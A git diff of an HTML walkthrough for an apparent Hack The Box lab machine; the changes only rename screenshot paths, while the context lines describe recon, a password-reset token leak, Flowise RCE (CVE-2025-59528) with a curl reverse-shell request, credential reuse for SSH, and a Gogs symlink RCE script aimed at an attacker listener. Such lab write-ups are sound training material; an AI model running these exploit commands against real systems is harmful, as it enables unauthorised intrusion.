@@ -67,14 +67,14 @@
                 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
-                <img src="../hackthebox/images/silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
                 <h3>Step 1: Recon & Port Scanning</h3>
                 <p>I started with a full aggressive Nmap scan to map out the attack surface:</p>
 
-                <img src="../hackthebox/images/nmapscan-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/nmapscan-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <div class="command-block">nmap -A 10.129.36.231</div>
@@ -92,7 +92,7 @@
                 <h3>Step 2: Virtual Host Discovery</h3>
                 <p>The main landing page for <code>silentium.htb</code> was a static institutional finance site. Nothing exploitable. I ran <strong>ffuf</strong> to search for subdomains:</p>
                 
-                <img src="../hackthebox/images/subdomainscan-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/subdomainscan-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <div class="command-block">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
@@ -105,16 +105,16 @@
                 <h3>Step 3: Authentication Bypass (Token Leak)</h3>
                 <p>While testing the login panel, I noticed that the application leaked information based on email responses. <code>test@silentium.htb</code> returned "user not found," but <code>ben@silentium.htb</code> gave a different response. Enumeration confirmed!</p>
 
-                <img src="../hackthebox/images/teststaging-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/teststaging-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
-                <img src="../hackthebox/images/benstaging-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/benstaging-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 
                 <p>I triggered a password reset for <strong>ben</strong> and inspected the network traffic in DevTools. The API response was catastrophically insecure:</p>
 
-                <img src="../hackthebox/images/benforgot-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/benforgot-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <div class="command-block">{
@@ -127,7 +127,7 @@
 
                 <p>I used the leaked <code>tempToken</code> to reset Ben's password and successfully logged into the Flowise dashboard.</p>
 
-                <img src="../hackthebox/images/bendashboard-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/bendashboard-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
@@ -136,11 +136,11 @@
                 <h3>Step 4: RCE via Flowise (CVE-2025-59528)</h3>
                 <p>Researching Flowise vulnerabilities led me to <strong>CVE-2025-59528</strong>, which allows Remote Code Execution via the <code>customMCP</code> method. I captured my JWT token and fired a reverse shell payload:</p>
 
-                <img src="../hackthebox/images/curlben-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/curlben-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
-                <img src="../hackthebox/images/customMCP-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/customMCP-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <div class="command-block">curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
@@ -165,20 +165,20 @@
 }'</div>
 
                 <p>I caught the shell </p>
-                <img src="../hackthebox/images/dockershell-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/dockershell-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <p>And found myself as <strong>root</strong>... but inside a Docker container. Checking the environment variables revealed an SMTP password: <code>r04D!!_R4ge</code>. </p>
-                <img src="../hackthebox/images/dockerenv-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/dockerenv-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
                 <p>Testing this for SSH as Ben worked perfectly!</p>
 
-                <img src="../hackthebox/images/ssheben-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/ssheben-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <p>And there I got the user flag</p>
-                <img src="../hackthebox/images/userflag-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/userflag-selentium.png" alt="Challenge Interface" class="content-img">
 
 
                 <div style="text-align: center; margin-top: 40px;">
@@ -189,23 +189,23 @@
 
                 <h3>Step 5: Internal Pivoting (Gogs)</h3>
                 <p>Checking internal services with <code>ss -tlnp</code>, I found Gogs running on port 3001. </p>
-                <img src="../hackthebox/images/services-running-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/services-running-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <p> I discovered Gogs was running as <strong>root</strong> after looking at the configurations files...</p>
-                <img src="../hackthebox/images/gogs-config-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/gogs-config-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <p>After which i port forwarded the service to my local machine </p>
 
                 <p>Visiting the browser i had to register a new user and i registered a user test and logged in</p>
-                <img src="../hackthebox/images/testdashboard-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/testdashboard-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
 
                 <p>In the system i tried creating a sample repo to try and exploit but failed... i tried using exploits but most of the exploit i used failed</p>
 
-                <img src="../hackthebox/images/fail-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/fail-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 
@@ -214,7 +214,7 @@
                 <p>I used <strong>CVE-2025-8110</strong> (Symlink RCE). By creating a repository that overwrites <code>.git/config</code> and injecting a <code>core.sshCommand</code>, I could execute arbitrary commands on the host when the repository is accessed.</p>
 
 
-                <img src="../hackthebox/images/rce-silentium.png" alt="Challenge Interface" class="content-img">
+                <img src="../hackthebox/images/rce-selentium.png" alt="Challenge Interface" class="content-img">
 
                 <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
                 <div class="command-block">python3 rce.py --url http://localhost:3001 --host 10.10.17.73 --port 6666--username test --password 'tester123'</div>
